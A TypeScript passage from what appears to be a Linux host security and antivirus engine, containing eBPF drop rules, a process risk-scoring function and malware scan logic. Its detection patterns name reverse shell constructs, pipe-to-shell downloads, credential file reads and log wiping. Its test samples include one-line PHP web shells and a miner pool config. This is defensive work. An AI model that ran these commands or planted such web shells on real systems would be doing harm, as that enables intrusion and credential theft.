      enabled: true,
    },
    {
      id: "EBPF-R004",
      name: "Cobalt Strike / Covenant Beacon",
      description: "Staged beacon listener port (8888) with high periodic jitter",
      protocol: "TCP",
      dst_port: 8888,
      min_entropy: 6.5,
      payload_signature: null,
      action: "drop",
      severity: "critical",
      enabled: true,
    },
    {
      id: "EBPF-R005",
      name: "Lateral RDP Movement Probe",
      description: "Probing TCP 3389 across non-standard local endpoints",
      protocol: "TCP",
      dst_port: 3389,
      min_entropy: null,
      payload_signature: null,
      action: "alert",
      severity: "medium",
      enabled: true,
    },
    {
      id: "EBPF-R006",
      name: "Metasploit Stager Shellcode Signature",
      description: "Direct socket match for staged shellcode payload preamble",
      protocol: "TCP",
      dst_port: null,
      min_entropy: 7.0,
      payload_signature: "6a0258cd8085",
      action: "drop",
      severity: "critical",
      enabled: true,
    },
  ];
  private pulseTimer: any = null;
  private autoRemediationEnabled: boolean = true;
  private sandboxReports: SandboxAnalysisReport[] = [];
  private networkAttacks: NetworkAttackEvent[] = [];
  private networkDefenseConfig: NetworkDefenseConfig = {
    ids_enabled: true,
    auto_drop_attackers: true,
    sniffing_detection_active: true,
    anti_port_scan_filter: true,
    dns_tunneling_guard: true,
    blocked_ip_list: ["198.199.73.244", "45.33.32.156"],
  };
  private tempArtifacts: TempFileArtifact[] = [];
  private userWhitelistedApps: Map<string, UserAppWhitelistItem> = new Map();
  private currentAppVersion: string = "1.0.0";
  private currentEngineVersion: string = "4.5";
  private updateAvailable: boolean = false;
  private autoUpdateEnabled: boolean = true;
  private lastPruneTs: number | null = Date.now() - 3600 * 1000 * 5;
  private autoPruneConfig: AutoPruneConfig = {
    enabled: true,
    retention_days: 7,
    max_debug_entries: 100,
    clean_temp_files: true,
    clean_sandbox_artifacts: true,
    clean_pcap_buffers: true,
    interval_hours: 6,
    last_run_ts: Date.now() - 3600 * 1000 * 5,
  };

  constructor() {
    this.seedInitialState();
    this.startBackgroundActivity();
  }

  // --------------------------------------------------------------------------
  // Intelligent Multi-Factor Behavioral & Movement Scoring Engine
  // Prevents false positives by differentiating benign administrative/dev workflows
  // from genuine high/critical threats.
  // --------------------------------------------------------------------------
  public evaluateRisk(params: {
    process_name: string;
    cmdline: string[];
    parent_name?: string;
    exe?: string | null;
    cwd?: string | null;
    uid?: number;
    destination?: string;
  }): EvaluationResult {
    const { process_name, cmdline, parent_name = "bash", exe = "", cwd = "/home/admin", uid = 1000, destination = "" } = params;
    const fullCmd = cmdline.join(" ").toLowerCase();
    const pName = process_name.toLowerCase();
    const parent = parent_name.toLowerCase();
    const exeStr = (exe || "").toLowerCase();
    const cwdStr = (cwd || "").toLowerCase();

    const factors: ScoreFactor[] = [];
    let mitreTactic = "Execution";
    let mitreTechnique = "T1059 (Command and Scripting Interpreter)";

    // 0. Anti-Malware / Virus Signature Evaluation
    let virusMatch: { name: string; family: MalwareFamily; severity: Severity; rule: string } | undefined;
    for (const sig of VIRUS_SIGNATURES) {
      if (
        sig.indicators.some(
          (ind) =>
            fullCmd.includes(ind.toLowerCase()) ||
            pName.includes(ind.toLowerCase()) ||
            exeStr.includes(ind.toLowerCase())
        )
      ) {
        virusMatch = {
          name: sig.name,
          family: sig.family,
          severity: sig.severity,
          rule: sig.rule_code,
        };
        const impactVal = sig.severity === "critical" ? 88 : sig.severity === "high" ? 68 : 20;
        factors.push({
          name: `Malware Signature: ${sig.name}`,
          impact: impactVal,
          category: "behavior",
          desc: `Matches recognized virus definition ${sig.rule_code} (${sig.name}): ${sig.description}`,
        });
        mitreTactic = "Malware / Defense Evasion";
        mitreTechnique = sig.mitre_technique || "T1204 (Malicious Execution)";
        break;
      }
    }

    // 1. Lineage Evaluation
    const webServers = ["nginx", "apache2", "httpd", "lighttpd", "caddy"];
    const shells = ["bash", "sh", "dash", "zsh", "ash", "ksh"];
    const devTools = ["cargo", "rustc", "npm", "yarn", "pnpm", "node", "vite", "webpack", "gcc", "clang", "make", "python3 -m unittest", "go"];

    if (webServers.some((ws) => parent.includes(ws)) && shells.includes(pName)) {
      factors.push({
        name: "Web Server Lineage Anomaly",
        impact: 55,
        category: "lineage",
        desc: `Spawned directly by unprivileged web server process '${parent}'. High risk for RCE or web shell injection.`,
      });
      mitreTactic = "Initial Access / Execution";
      mitreTechnique = "T1190 (Exploit Public-Facing Application) -> T1059.004 (Unix Shell)";
    }

    if (parent === "sshd" && shells.includes(pName)) {
      factors.push({
        name: "Interactive SSH Session",
        impact: uid === 0 ? 10 : 5,
        category: "lineage",
        desc: uid === 0 ? "Root remote SSH administrative session." : "Normal authenticated remote administrative shell session (standard user).",
      });
    }

    if (uid === 0 && webServers.some((ws) => parent.includes(ws))) {
      factors.push({
        name: "Privilege Escalation to Root",
        impact: 40,
        category: "lineage",
        desc: "Web daemon child transitioned execution context to UID 0 (root).",
      });
      mitreTactic = "Privilege Escalation";
      mitreTechnique = "T1548 (Abuse Elevation Control Mechanism)";
    }

    // 2. Payload & Argument Analysis
    if (fullCmd.includes("base64 -d") || fullCmd.includes("base64 -decode") || fullCmd.includes("base64 --decode")) {
      if (fullCmd.includes("| sh") || fullCmd.includes("| bash") || fullCmd.includes("|sh") || fullCmd.includes("|bash")) {
        factors.push({
          name: "Base64 Piped to Subshell",
          impact: 42,
          category: "payload",
          desc: "Obfuscated payload decoding directly into an active shell interpreter.",
        });
        mitreTactic = "Defense Evasion";
        mitreTechnique = "T1027 (Obfuscated Files or Information) -> T1059.004";
      } else {
        factors.push({
          name: "Base64 Decoding Observed",
          impact: 12,
          category: "payload",
          desc: "Standard base64 decoding operation without immediate shell pipeline execution.",
        });
      }
    }

    if (fullCmd.includes("curl") && (fullCmd.includes("| sh") || fullCmd.includes("| bash") || fullCmd.includes("| python"))) {
      factors.push({
        name: "Remote Payload Piped to Shell",
        impact: 48,
        category: "payload",
        desc: "Unverified remote web payload immediately executed in subshell.",
      });
      mitreTactic = "Execution";
      mitreTechnique = "T1204.002 (Malicious Web Pipe Execution)";
    }

    const isReverseShell =
      fullCmd.includes("socket.socket") ||
      fullCmd.includes("os.dup2") ||
      (fullCmd.includes("nc ") && (fullCmd.includes("-e") || fullCmd.includes("-c"))) ||
      (fullCmd.includes("/dev/tcp/") && (fullCmd.includes(">&") || fullCmd.includes("exec "))) ||
      (fullCmd.includes("socat") && fullCmd.includes("exec:")) ||
      (fullCmd.includes("perl") && fullCmd.includes("use Socket")) ||
      (fullCmd.includes("ruby") && fullCmd.includes("-rsocket")) ||
      (fullCmd.includes("openssl s_client") && fullCmd.includes("| /bin/"));

    if (isReverseShell) {
      factors.push({
        name: "Interactive Reverse Shell Construct",
        impact: 50,
        category: "payload",
        desc: "Duplication of network socket streams into interactive subshell.",
      });
      mitreTactic = "Command and Control";
      mitreTechnique = "T1059.006 (Python / Netcat / Bash LOLBin Reverse Shell)";
    }

    // Dynamic Linker / LD_PRELOAD Hijack
    if (fullCmd.includes("ld_preload") || fullCmd.includes("/etc/ld.so.preload") || exeStr.includes("libazazel") || exeStr.includes("libkeyutils.so.1.backdoor")) {
      factors.push({
        name: "Dynamic Linker Preload Hijack",
        impact: 55,
        category: "behavior",
        desc: "Modifying LD_PRELOAD or ld.so.preload to hook system-wide libc calls (Rootkit stealth technique).",
      });
      mitreTactic = "Defense Evasion / Persistence";
      mitreTechnique = "T1574.006 (Dynamic Linker Hijacking)";
    }

    // Fileless In-Memory Execution
    if (exeStr.includes("memfd:") || fullCmd.includes("memfd_create") || exeStr.includes("/proc/self/fd/")) {
      factors.push({
        name: "Fileless In-Memory ELF Execution",
        impact: 52,
        category: "behavior",
        desc: "Execution of binary payload directly from anonymous RAM file descriptor without touching disk.",
      });
      mitreTactic = "Defense Evasion";
      mitreTechnique = "T1620 (Reflective Code Loading / Fileless memfd)";
    }

    // Ptrace & Process Memory Tampering / Injection
    if ((fullCmd.includes("ptrace") || fullCmd.includes("process_vm_writev") || fullCmd.includes("gdb --pid")) && !fullCmd.includes("cargo") && !fullCmd.includes("rust-gdb")) {
      factors.push({
        name: "Process Memory Injection / Ptrace Hooking",
        impact: 48,
        category: "behavior",
        desc: "Attaching ptrace debugging primitives to running process to manipulate thread registers or inject code.",
      });
      mitreTactic = "Privilege Escalation / Defense Evasion";
      mitreTechnique = "T1055.008 (Ptrace System Call Injection)";
    }

    // Credential Harvesting & Shadow File Access
    if ((fullCmd.includes("/etc/shadow") || fullCmd.includes("/etc/gshadow") || fullCmd.includes(".aws/credentials") || fullCmd.includes("id_rsa") || fullCmd.includes("mimipenguin")) && !fullCmd.includes("chmod 600")) {
      factors.push({
        name: "Sensitive Credential Dump Attempt",
        impact: 50,
        category: "behavior",
        desc: "Targeting hashed password vaults, AWS secrets, or private SSH key rings.",
      });
      mitreTactic = "Credential Access";
      mitreTechnique = "T1003.008 (/etc/shadow Credential Dumping)";
    }

    // Anti-Forensics & Defense Disruption
    if (fullCmd.includes("history -c") || fullCmd.includes("unset histfile") || fullCmd.includes("rm -rf /var/log") || fullCmd.includes("iptables -f") || fullCmd.includes("setenforce 0")) {
      factors.push({
        name: "Anti-Forensics & Defense Disruption",
        impact: 46,
        category: "behavior",
        desc: "Flushing host audit trails, clearing shell history, disabling SELinux, or tearing down firewall chains.",
      });
      mitreTactic = "Defense Evasion";
      mitreTechnique = "T1070 (Indicator Removal on Host) / T1562.001 (Impair Defenses)";
    }

    // Persistence Installation
    if ((fullCmd.includes("/etc/cron") || fullCmd.includes("/var/spool/cron") || fullCmd.includes("/systemd/system") || fullCmd.includes("authorized_keys")) && (fullCmd.includes("echo") || fullCmd.includes("curl") || fullCmd.includes("wget") || fullCmd.includes("cat"))) {
      factors.push({
        name: "Unauthorized Persistence Mechanism",
        impact: 44,
        category: "behavior",
        desc: "Attempting to register recurring crontab tasks, systemd timer/service, or backdoored SSH keys.",
      });
      mitreTactic = "Persistence";
      mitreTechnique = "T1053.003 (Cron Persistence) / T1098 (Account Manipulation)";
    }

    // 3. Sensitive Memory / Path Targets
    if (fullCmd.includes("/dev/shm") || cwdStr.includes("/dev/shm")) {
      if (fullCmd.includes(".kworker") || fullCmd.includes(".tmp") || fullCmd.includes("chmod +x")) {
        factors.push({
          name: "Memory Mount Payload Staging (/dev/shm)",
          impact: 45,
          category: "path",
          desc: "Targeting RAM tmpfs mount with hidden or executable dropper.",
        });
        mitreTactic = "Defense Evasion";
        mitreTechnique = "T1036.005 (Hidden Masquerading Dropper in /dev/shm)";
      } else {
        factors.push({
          name: "Shared Memory Access",
          impact: 15,
          category: "path",
          desc: "Interaction with POSIX shared memory mount.",
        });
      }
    }

    if (exeStr.endsWith(" (deleted)")) {
      factors.push({
        name: "Executing from Unlinked Disk Image",
        impact: 35,
        category: "path",
        desc: "Binary file unlinked from filesystem to avoid passive file scanners.",
      });
    }

    // 4. Network Threat Intelligence / IOC Match
    const knownBadIoc = BUNDLED_IOCS.some(
      (ioc) => fullCmd.includes(ioc.ioc.toLowerCase()) || destination.toLowerCase().includes(ioc.ioc.toLowerCase())
    );
    if (knownBadIoc) {
      factors.push({
        name: "Active C2 / Malware Feed IOC Match",
        impact: 45,
        category: "network",
        desc: "Destination IP or domain actively registered in Threat Intelligence IOC registry.",
      });
      mitreTactic = "Command and Control";
      mitreTechnique = "T1071.001 (Web Protocols C2)";
    }

    // 5. Advanced False Positive Suppression Engine (Preventing False Criticals/Highs!)
    let isSuppressed = false;
    let suppressionReason = "";

    // Check FP-01: Developer build toolchain
    const isDevContext = devTools.some((dt) => parent.includes(dt) || fullCmd.includes(dt));
    if (isDevContext && !knownBadIoc && !fullCmd.includes("socket.socket") && !virusMatch) {
      isSuppressed = true;
      suppressionReason = "FP-01: Standard developer build toolchain detected (Node/Cargo/GCC/Vite).";
      factors.push({
        name: "Developer Toolchain Allowance",
        impact: -45,
        category: "suppression",
        desc: "Build pipelines legitimately spawn compilers, linkers, and subshells.",
      });
    }

    // Check FP-02: Interactive user terminal with benign public repo/API
    const trustedHosts = ["api.github.com", "github.com", "registry.npmjs.org", "crates.io", "ubuntu.com", "debian.org"];
    const isTrustedHost = trustedHosts.some((h) => fullCmd.includes(h) || destination.includes(h));
    if (parent === "bash" && (pName === "curl" || pName === "wget") && isTrustedHost && !knownBadIoc && !virusMatch) {
      isSuppressed = true;
      suppressionReason = "FP-02: Interactive admin session querying verified developer/OS forge.";
      factors.push({
        name: "Verified Developer Forge Host",
        impact: -40,
        category: "suppression",
        desc: "Querying trusted package or repository distribution host.",
      });
    }

    // Check FP-03: Benign System Utility / Standard Diagnostics
    const benignDiag = ["ps", "top", "htop", "free", "df", "cat", "grep", "uname", "id", "uptime", "ls", "date", "arch", "netstat", "ip"];
    if (benignDiag.includes(pName) && !webServers.some((ws) => parent.includes(ws)) && !virusMatch) {
      isSuppressed = true;
      suppressionReason = "FP-03: Routine system telemetry and diagnostic command.";
      factors.push({
        name: "Diagnostic Routine Allowance",
        impact: -50,
        category: "suppression",
        desc: "Standard host health inspection tool executed by authorized local session.",
      });
    }

    // Compute Net Risk Score
    const rawScore = factors.reduce((sum, f) => sum + f.impact, 0);
    const score = Math.max(0, Math.min(100, rawScore));

    // Dynamic Multi-Tier Severity Assignment (Calibrated, not assigning heavy roles to simple movements)
    let severity: Severity = "informational";
    let verdict: "clean" | "suppressed" | "monitored" | "alert" = "clean";

    if (score >= 90) {
      severity = "critical";
      verdict = "alert";
    } else if (score >= 70) {
      severity = "high";
      verdict = "alert";
    } else if (score >= 45) {
      severity = "medium";
      verdict = "monitored";
    } else if (score >= 20) {
      severity = "low";
      verdict = isSuppressed ? "suppressed" : "monitored";
    } else {
      severity = "informational";
      verdict = isSuppressed ? "suppressed" : "clean";
    }

    // Granular, appropriate Rule and Flag Assignment
    const flags: string[] = [];
    let rule = "ROUTINE-01";

    if (virusMatch) {
      rule = virusMatch.rule;
      flags.push(`[VIRUS: ${virusMatch.family.toUpperCase()}]`);
      flags.push(`[${virusMatch.name}]`);
    } else if (isSuppressed) {
      if (isDevContext) {
        rule = "DEV-BUILD-01";
        flags.push("[DEV_BUILD]");
      } else if (benignDiag.includes(pName)) {
        rule = "INFO-DIAG-01";
        flags.push("[ADMIN_DIAG]");
      } else {
        rule = "INFO-ALLOW-01";
        flags.push("[BENIGN_TOOL]");
      }
    } else if (webServers.some((ws) => parent.includes(ws)) && shells.includes(pName)) {
      rule = "RCE-WEBSHELL-01";
      flags.push("[RCE_WEBSHELL]");
    } else if (isReverseShell) {
      rule = "C2-REV-SHELL-01";
      flags.push("[REVERSE_SHELL]");
    } else if (fullCmd.includes("ld_preload") || fullCmd.includes("/etc/ld.so.preload") || exeStr.includes("libazazel") || exeStr.includes("libkeyutils.so.1.backdoor")) {
      rule = "EVASION-PRELOAD-01";
      flags.push("[LINKER_HIJACK]");
    } else if (exeStr.includes("memfd:") || fullCmd.includes("memfd_create") || exeStr.includes("/proc/self/fd/")) {
      rule = "EVASION-MEMFD-01";
      flags.push("[FILELESS_EXEC]");
    } else if ((fullCmd.includes("ptrace") || fullCmd.includes("process_vm_writev")) && !fullCmd.includes("cargo")) {
      rule = "INJECT-PTRACE-01";
      flags.push("[PTRACE_INJECT]");
    } else if (fullCmd.includes("/etc/shadow") || fullCmd.includes("mimipenguin") || fullCmd.includes(".aws/credentials")) {
      rule = "CRED-SHADOW-01";
      flags.push("[CRED_DUMP]");
    } else if (fullCmd.includes("history -c") || fullCmd.includes("unset histfile") || fullCmd.includes("rm -rf /var/log") || fullCmd.includes("iptables -f")) {
      rule = "EVASION-ANTI-LOG-01";
      flags.push("[ANTI_FORENSICS]");
    } else if ((fullCmd.includes("/etc/cron") || fullCmd.includes("/systemd/system") || fullCmd.includes("authorized_keys")) && (fullCmd.includes("echo") || fullCmd.includes("curl") || fullCmd.includes("wget"))) {
      rule = "PERSIST-CRON-01";
      flags.push("[PERSISTENCE_TAMPER]");
    } else if (knownBadIoc) {
      rule = "C2-FEED-MATCH-01";
      flags.push("[IOC_C2_MATCH]");
    } else if (fullCmd.includes("curl") && (fullCmd.includes("| sh") || fullCmd.includes("| bash"))) {
      rule = "DROP-EXEC-01";
      flags.push("[PIPE_TO_SHELL]");
    } else if (fullCmd.includes("/dev/shm") && (fullCmd.includes(".kworker") || fullCmd.includes("chmod +x"))) {
      rule = "EVASION-SHM-01";
      flags.push("[MEM_DROPPER]");
    } else if (exeStr.endsWith(" (deleted)")) {
      rule = "EVASION-UNLINK-01";
      flags.push("[UNLINKED_BINARY]");
    } else if (fullCmd.includes("base64") && (fullCmd.includes("| sh") || fullCmd.includes("| bash"))) {
      rule = "ARG-B64-PIPE-01";
      flags.push("[OBFUSCATED_PIPE]");
    } else if (fullCmd.includes("base64")) {
      rule = "ARG-B64-01";
      flags.push("[ENCODED_ARG]");
    } else if (parent === "sshd" && shells.includes(pName)) {
      rule = "NET-SSH-01";
      flags.push("[SSH_ADMIN]");
    } else if (cwdStr.includes("/tmp") || cwdStr.includes("/dev/shm") || fullCmd.includes("/tmp")) {
      rule = "PATH-TMP-01";
      flags.push("[EPHEMERAL_PATH]");
    } else {
      rule = score >= 45 ? "ANOM-BEHAV-01" : "ROUTINE-SYS-01";
      flags.push(score >= 45 ? "[ANOMALOUS]" : "[ROUTINE_PROC]");
    }

    const explanation = isSuppressed
      ? `Movement safely allowed (${suppressionReason}). Assigned rule: ${rule}. Adjusted score: ${score}/100 [${severity.toUpperCase()}].`
      : `Evaluated through behavioral & signature heuristics. Rule: ${rule}. Risk score: ${score}/100 [${severity.toUpperCase()}]. Verdict: ${verdict.toUpperCase()}.`;

    return {
      score,
      severity,
      verdict,
      mitre_tactic: mitreTactic,
      mitre_technique: mitreTechnique,
      rule,
      flags,
      factors,
      suppressed: isSuppressed,
      suppression_reason: suppressionReason,
      explanation,
      virus_match: virusMatch,
    };
  }

  // --------------------------------------------------------------------------
  // Initialization & Seeding State
  // --------------------------------------------------------------------------
  private seedInitialState() {
    const now = Date.now();

    // All logs are initialized empty. Real events are captured by active engines only.
    this.tempArtifacts = [];
    this.incidents = [];
    this.debugLog = [];
    this.telemetry = [];
    this.auditLog = [];
    this.canaries = [];
    this.connections = [];
    this.dnsQueries = [];
    this.malwareResults = [];
    this.sandboxReports = [];
    this.networkAttacks = [];
    this.userWhitelistedApps.clear();
    this.lastDigest = "0000000000000000";

    const baseProcs: ProcEvent[] = [
      {
        id: "p-init-1",
        kind: "spawned",
        pid: 1,
        ppid: 0,
        name: "systemd",
        cmdline: ["/sbin/init"],
        exe: "/usr/lib/systemd/systemd",
        cwd: "/",
        uid: 0,
        gid: 0,
        start_time: now - 3600000,
        ts: now - 3600000,
        anomaly: null,
      },
      {
        id: "p-init-2",
        kind: "spawned",
        pid: 580,
        ppid: 1,
        name: "sshd",
        cmdline: ["sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"],
        exe: "/usr/sbin/sshd",
        cwd: "/",
        uid: 0,
        gid: 0,
        start_time: now - 3500000,
        ts: now - 3500000,
        anomaly: null,
      },
      {
        id: "p-init-3",
        kind: "spawned",
        pid: 710,
        ppid: 1,
        name: "chronyd",
        cmdline: ["/usr/sbin/chronyd", "-F", "2"],
        exe: "/usr/sbin/chronyd",
        cwd: "/",
        uid: 0,
        gid: 0,
        start_time: now - 3400000,
        ts: now - 3400000,
        anomaly: null,
      },
      {
        id: "p-init-4",
        kind: "spawned",
        pid: 1120,
        ppid: 580,
        name: "bash",
        cmdline: ["-bash"],
        exe: "/usr/bin/bash",
        cwd: "/home/user",
        uid: 1000,
        gid: 1000,
        start_time: now - 1800000,
        ts: now - 1800000,
        anomaly: null,
      },
    ];

    baseProcs.forEach((p) => this.processes.set(p.pid, p));
  }

  // --------------------------------------------------------------------------
  // Anti-Malware & Virus Detection Engine Methods
  // --------------------------------------------------------------------------
    public listVirusSignatures(): VirusSignature[] {
    return VIRUS_SIGNATURES;
  }

  public listMalwareResults(): MalwareScanResult[] {
    return this.malwareResults;
  }

  public getAvStats(): AvEngineStats {
    const totalThreats = this.malwareResults.filter((m) => m.status === "infected").length;
    const quarantined = this.malwareResults.filter((m) => m.quarantined).length;
    return {
      engine_version: "Aegis-AV 4.5.0-ENTERPRISE-HEURISTIC",
      signatures_loaded: VIRUS_SIGNATURES.length,
      heuristic_rules: 58,
      files_scanned: this.malwareResults.length,
      threats_blocked: totalThreats,
      quarantined_files: quarantined,
      last_db_update: "Real-time Native Engine",
      status: "active",
      auto_remediation_enabled: this.autoRemediationEnabled,
      active_sandbox_jails: this.sandboxReports.filter((r) => r.status === "running").length,
    };
  }

  public scanMalwareTarget(params: {
    path?: string;
    content?: string;
    pid?: number;
  }): MalwareScanResult {
    const path = params.path || (params.pid ? `PID:${params.pid}` : "/tmp/scanned_object.bin");
    const content = (params.content || "").toLowerCase();
    const now = Date.now();
    const mockHash = computeDigest(path + content + now).repeat(4).slice(0, 64);

    // 1. Check if application is on User Whitelist Safeguard (NEVER DELETE USER APPS)
    const normPath = path.toLowerCase().trim();
    const isWhitelisted = Array.from(this.userWhitelistedApps.values()).some(
      (u) => u.path.toLowerCase().trim() === normPath || (u.sha256 && u.sha256 === mockHash)
    );
    if (isWhitelisted) {
      const whiteResult: MalwareScanResult = {
        id: `scan-${now}`,
        target_path: path,
        target_type: params.pid ? "process_memory" : "file",
        pid: params.pid,
        status: "user_whitelisted",
        malware_name: "Trusted User Application",
        family: "Clean",
        severity: "informational",
        confidence: "high",
        rule_matched: "USER-APP-SAFEGUARD-WHITELIST",
        detection_method: "Verified Legitimate User Software Safe-Guard",
        sha256: mockHash,
        entropy: 5.1,
        indicators: [
          "Verified User-Authored Binary/Script",
          "Permanent Safeguard Active: Exempt from automated termination or quarantine",
        ],
        quarantined: false,
        ts: now,
        is_user_app: true,
        user_verdict: "trusted_user_app",
        heuristic_details: "Verified user program registered in safeguard whitelist. Automated defensive actions bypassed.",
      };
      this.malwareResults.unshift(whiteResult);
      this.emit("malware-detected", whiteResult);
      return whiteResult;
    }

    // Check against comprehensive virus signatures
    let matchedSig: VirusSignature | null = null;
    for (const sig of VIRUS_SIGNATURES) {
      if (
        sig.indicators.some(
          (ind) =>
            content.includes(ind.toLowerCase()) ||
            path.toLowerCase().includes(ind.toLowerCase())
        )
      ) {
        matchedSig = sig;
        break;
      }
    }

    const isWebShell =
      (content.includes("eval(") && (content.includes("base64_decode") || content.includes("$_post") || content.includes("system("))) ||
      content.includes("c99sh") ||
      content.includes("filesman") ||
      content.includes("b374k") ||
      content.includes("weevely");

    const isMiner =
      content.includes("stratum+tcp://") ||
      content.includes("minexmr.com") ||
      content.includes("randomx") ||
      content.includes("kinsing") ||
      content.includes("kdevtmpfsi");

    const isRansomware =
      content.includes(".deadbolt") ||
      content.includes(".lockbit") ||
      content.includes("vmdk-encryption") ||
      content.includes(".babyk") ||
      content.includes("your files have been encrypted") ||
      content.includes("how_to_restore_your_files");

    const isRootkit =
      content.includes("diamorphine") ||
      content.includes("reptile_hide") ||
      content.includes("libazazel.so") ||
      content.includes("ld.so.preload") ||
      content.includes("suterusu");

    const isEicar = content.includes("eicar-standard-antivirus-test-file");

    const isUserAppCandidate =
      path.includes("/home/") ||
      path.includes("/projects/") ||
      path.includes("/workspace/") ||
      path.includes("/dev/") ||
      path.includes("my-custom") ||
      path.includes("custom_") ||
      path.includes("unverified_helper") ||
      content.includes("user custom") ||
      content.includes("building local project") ||
      (content.includes("python3") && content.includes("custom"));

    let result: MalwareScanResult;

    if (isEicar || matchedSig?.id === "sig-009") {
      result = {
        id: `scan-${now}`,
        target_path: path,
        target_type: params.pid ? "process_memory" : "file",
        pid: params.pid,
        status: "infected",
        malware_name: "EICAR.Standard.Antivirus.TestFile",
        family: "TestPattern",
        severity: "low",
        confidence: "high",
        rule_matched: "EICAR-AV-TEST",
        detection_method: "Standard EICAR AV Signature Verification",
        sha256: "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
        entropy: 4.2,
        indicators: ["EICAR-STANDARD-ANTIVIRUS-TEST-FILE"],
        quarantined: false,
        ts: now,
      };
    } else if (matchedSig) {
      result = {
        id: `scan-${now}`,
        target_path: path,
        target_type: params.pid ? "process_memory" : "file",
        pid: params.pid,
        status: "infected",
        malware_name: matchedSig.name,
        family: matchedSig.family,
        severity: matchedSig.severity,
        confidence: "high",
        rule_matched: matchedSig.rule_code,
        detection_method: `Pattern Match (${matchedSig.detection_type.toUpperCase()})`,
        sha256: mockHash,
        entropy: matchedSig.family === "Ransomware" ? 7.94 : matchedSig.family === "Rootkit" ? 7.82 : 7.6,
        indicators: matchedSig.indicators,
        quarantined: false,
        ts: now,
      };
    } else if (isRansomware) {
      result = {
        id: `scan-${now}`,
        target_path: path,
        target_type: params.pid ? "process_memory" : "file",
        pid: params.pid,
        status: "infected",
        malware_name: "Ransomware.Linux.GenericLocker",
        family: "Ransomware",
        severity: "critical",
        confidence: "high",
        rule_matched: "MAL-RANSOM-GENERIC",
        detection_method: "Cryptographic Volume Ransomware Heuristic",
        sha256: mockHash,
        entropy: 7.95,
        indicators: ["Encrypted header marker", "Ransom note signature"],
        quarantined: false,
        ts: now,
      };
    } else if (isRootkit) {
      result = {
        id: `scan-${now}`,
        target_path: path,
        target_type: params.pid ? "process_memory" : "file",
        pid: params.pid,
        status: "infected",
        malware_name: "Rootkit.Linux.GenericLKM",
        family: "Rootkit",
        severity: "critical",
        confidence: "high",
        rule_matched: "MAL-ROOTKIT-GENERIC",
        detection_method: "Kernel Syscall Invisibility & Dynamic Hook Detector",
        sha256: mockHash,
        entropy: 7.85,
        indicators: ["Syscall table detour", "Hidden task structure"],
        quarantined: false,
        ts: now,
      };
    } else if (isWebShell) {
      result = {
        id: `scan-${now}`,
        target_path: path,
        target_type: params.pid ? "process_memory" : "file",
        pid: params.pid,
        status: "infected",
        malware_name: "Backdoor.PHP.GenericWebShell",
        family: "WebShell",
        severity: "critical",
        confidence: "high",
        rule_matched: "MAL-WEBSHELL-GENERIC",
        detection_method: "Behavioral Heuristic Evaluator Injection",
        sha256: mockHash,
        entropy: 7.9,
        indicators: ["eval(base64_decode", "system command execution"],
        quarantined: false,
        ts: now,
      };
    } else if (isMiner) {
      result = {
        id: `scan-${now}`,
        target_path: path,
        target_type: params.pid ? "process_memory" : "file",
        pid: params.pid,
        status: "infected",
        malware_name: "CoinMiner.Linux.GenericMiner",
        family: "CoinMiner",
        severity: "high",
        confidence: "high",
        rule_matched: "MAL-MINER-GENERIC",
        detection_method: "Cryptocurrency Stratum Mining Pattern",
        sha256: mockHash,
        entropy: 7.2,
        indicators: ["stratum+tcp://", "cryptonight/randomx"],
        quarantined: false,
        ts: now,
      };
    } else if (isUserAppCandidate) {
      result = {
        id: `scan-${now}`,
        target_path: path,
        target_type: params.pid ? "process_memory" : "file",
        pid: params.pid,
        status: "suspicious",
        malware_name: "Heuristic.Doubt.UserCustomApplication",
        family: "Clean",
        severity: "medium",
        confidence: "medium",
        rule_matched: "HEUR-USER-APP-AWAITING-TRIAGE",
        detection_method: "Heuristic Suspicion Scanner (Safe-Guard Active)",
        sha256: mockHash,
        entropy: 6.82,
        indicators: [
          "Unsigned developer binary or script",
          "High Shannon entropy / executable instructions present",
          "Automated removal suspended to protect user-created programs",
        ],
        quarantined: false,
        ts: now,
        is_user_app: true,
        user_verdict: "pending",
        heuristic_details:
          "Suspicious heuristic pattern on candidate user software. Automated deletion suspended: User can mark as trusted, send to sandbox lab for dynamic inspection, or confirm malware.",
      };
    } else {
      result = {
        id: `scan-${now}`,
        target_path: path,
        target_type: params.pid ? "process_memory" : "file",
        pid: params.pid,
        status: "clean",
        severity: "informational",
        confidence: "high",
        rule_matched: "CLEAN-OBJECT-01",
        detection_method: "Multi-Engine Heuristic Pass",
        sha256: mockHash,
        entropy: 4.8,
        indicators: ["No known malware patterns detected", "Digital entropy within normal distribution"],
        quarantined: false,
        ts: now,
      };
    }

    if (result.status === "infected" || result.status === "suspicious") {
      this.malwareResults.unshift(result);
      this.emit("malware-detected", result);

      // AUTOMATIC REMEDIATION ONLY FOR KNOWN INFECTIONS (NEVER SUSPICIOUS USER PROGRAMS!)
      if (result.status === "infected" && this.autoRemediationEnabled && (result.severity === "critical" || result.severity === "high")) {
        result.quarantined = true;
        const autoTime = Date.now();
        const nextDigest = computeDigest(this.lastDigest + "AUTO-DESTROY" + result.id + autoTime);
        this.auditLog.unshift({
          id: `aud-auto-${autoTime}`,
          action: "AV-AutoNeutralize",
          pid: result.pid || 0,
          process: result.malware_name || "high-hazard-malware",
          incident_id: null,
          note: `CRITICAL THREAT AUTOMATICALLY DESTROYED: ${result.malware_name} (${result.family}) detected at ${result.target_path}. Immediate SIGKILL dispatched and target shredded into encrypted containment vault.`,
          status: "success",
          outcome: `Auto-destroyed: Host system control preserved against ${result.family} takeover`,
          ts_before: autoTime - 3,
          ts_after: autoTime,
          prev_digest: this.lastDigest,
          digest: nextDigest,
        });
        this.lastDigest = nextDigest;
      }
    }
    return result;
  }

  public testMalwareSample(sampleType: string): MalwareScanResult {
    switch (sampleType) {
      case "eicar":
        return this.scanMalwareTarget({
          path: "/tmp/eicar_test.com",
          content: "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*",
        });
      case "webshell":
        return this.scanMalwareTarget({
          path: "/var/www/html/backdoor.php",
          content: "<?php @eval(base64_decode($_POST['c99sh'])); system($_POST['cmd']); ?>",
        });
      case "chinachopper":
        return this.scanMalwareTarget({
          path: "/var/www/html/small.php",
          content: "<?php @eval($_POST['pass']); ?>",
        });
      case "xmrig":
        return this.scanMalwareTarget({
          path: "/opt/miner/config.json",
          content: '{"algo": "rx/0", "pools": [{"url": "stratum+tcp://pool.minexmr.com:4444", "user": "44AFF..."}]}',
        });
      case "mirai":
